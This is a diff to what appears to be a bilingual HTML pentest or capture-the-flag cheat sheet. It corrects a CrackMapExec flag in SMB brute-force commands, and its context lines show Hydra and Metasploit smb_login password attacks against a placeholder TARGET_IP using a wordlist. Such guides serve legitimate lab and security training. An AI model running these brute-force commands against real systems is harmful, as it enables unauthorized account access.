@@ -196,7 +196,7 @@ cat ftp_flag.txt
     <h3>🖧 SMB (puerto 445)</h3>
     <h4>Bruteforce — Hydra / CrackMapExec</h4>
     <pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/fasttrack.txt smb://TARGET_IP
-crackmapexec smb TARGET_IP -u admin -P /usr/share/wordlists/fasttrack.txt</code></pre>
+crackmapexec smb TARGET_IP -u admin -p /usr/share/wordlists/fasttrack.txt</code></pre>
     <h4>Bruteforce — Metasploit</h4>
     <pre><code class="language-bash">use auxiliary/scanner/smb/smb_login
 set RHOSTS TARGET_IP
@@ -290,7 +290,7 @@ cat ftp_flag.txt
     <h3>🖧 SMB (port 445)</h3>
     <h4>Bruteforce — Hydra / CrackMapExec</h4>
     <pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/fasttrack.txt smb://TARGET_IP
-crackmapexec smb TARGET_IP -u admin -P /usr/share/wordlists/fasttrack.txt</code></pre>
+crackmapexec smb TARGET_IP -u admin -p /usr/share/wordlists/fasttrack.txt</code></pre>
     <h4>Bruteforce — Metasploit</h4>
     <pre><code class="language-bash">use auxiliary/scanner/smb/smb_login
 set RHOSTS TARGET_IP
